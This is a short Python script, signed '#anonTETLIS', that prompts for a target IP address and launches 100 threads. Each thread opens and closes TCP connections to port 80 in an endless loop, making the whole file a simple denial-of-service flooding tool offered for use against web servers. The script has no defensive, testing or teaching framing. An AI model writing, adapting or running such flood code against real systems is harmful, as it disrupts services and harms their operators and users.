#anonTETLIS

import socket,threading

print("hello")
ip = input("inter target ip : ")
port = 80

def at():
    i = 0
    while True:
        sok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sok.connect((ip,port))
        sok.close()
        i += 1
        print(i)

for i in range(100):
    tr=threading.Thread(target=at)
    tr.start()
